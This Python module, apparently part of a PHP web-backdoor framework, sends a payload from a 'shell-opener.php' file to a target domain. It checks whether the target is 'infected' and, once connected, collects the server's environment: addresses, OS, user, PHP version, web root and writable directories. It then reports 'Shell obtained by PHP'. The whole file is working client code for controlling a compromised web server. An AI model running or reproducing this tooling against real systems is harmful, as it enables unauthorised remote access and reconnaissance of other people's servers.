import time, base64
import network.sender

from functions import *

class Start:
    success = False
    starter = getpath('framework/phpfiles/shell-opener.php').phpcode()

    def __init__(self, CONF):
        self.CONF   = CONF

        request = network.sender.Load(self.CONF)

        print P_inf+'Sending http payload...'
        request.open(self.starter)

        if request.error:
            if request.error == 'request':
                print P_err+'Error connecting to the target'
            if request.error == 'execution':
                print P_err+'The target does not seem to be infected'
            return(None)

        self.success = True

        env = self.getenv(request.read())
        srv = self.buildServerVars(env)
        srv['ENV'] = env

        print P_inf+'Shell obtained by PHP (%s -> %s:%s)' %(srv['client_addr'],srv['addr'],srv['port'])
        print ''
        self.SERVER = srv


    def close(self):
        print P_inf+'Connection to %s closed.' % self.CONF['OPENER']['DOMAIN']
        return(True)

    def getenv(self, env):
        result = list()
        for name, value in env.items():
            #if value and (name not in self.env_blacklist):
            value = str(value)
            value = value.strip()
            result.append((name, value))
        return dict(result)


    def buildServerVars(self, env):

        def get(options, default=''):
            for choice in options:
                if choice in env:
                    if env[choice].strip():
                        return(env[choice])
            return(default)

        srv = dict()

        srv['client_addr']   = get(['REMOTE_ADDR','REMOTE_HOST'])
        if ":" in srv['client_addr']:srv['client_addr'] = "[%s]" % srv['client_addr']
        srv['host']          = get(['SERVER_NAME','HTTP_HOST'],self.CONF['OPENER']['DOMAIN'])
        srv['addr']          = get(['SERVER_ADDR','LOCAL_ADDR'],srv['host'])
        if ":" in srv['addr']:srv['addr'] = "[%s]" % srv['addr']
        srv['port']          = get(['SERVER_PORT'],'80')
        srv['os']            = get(['OS','PHP_OS'],'unknow')
        srv['user']          =(get(['WHOAMI','USERNAME','USER']) or
                               get(['USERPROFILE'],'unknow').split('\\')[-1])
        srv['soft']          = get(['SERVER_SOFTWARE'],'unknow software')
        srv['phpver']        = get(['PHP_VERSION'],'?')
        srv['webroot']       = get(['WEBROOT'])
        srv['home']          = get(['HOME'],srv['webroot'])

        srv['write_webdir']  = get(['W_WEBDIR'])
        srv['write_tmpdir']  = get(['W_TMPDIR'])


        if not srv['home']:
            path = get(['SCRIPT_FILENAME',
                        'PATH_TRANSLATED'])
            sep = '\\'
            if not path:
                path = '/'
            else:
                if path[0] == '/': sep = '/'
                path = sep.join(path.split(sep)[0:-1])
            srv['home'] = path

        srv['separator'] = '\\'
        if srv['home'].startswith('/'):
            srv['separator'] = '/'

        srv['platform'] = 'nix'
        if srv['separator'] == '\\':
            srv['platform'] = 'win'

        return(srv)
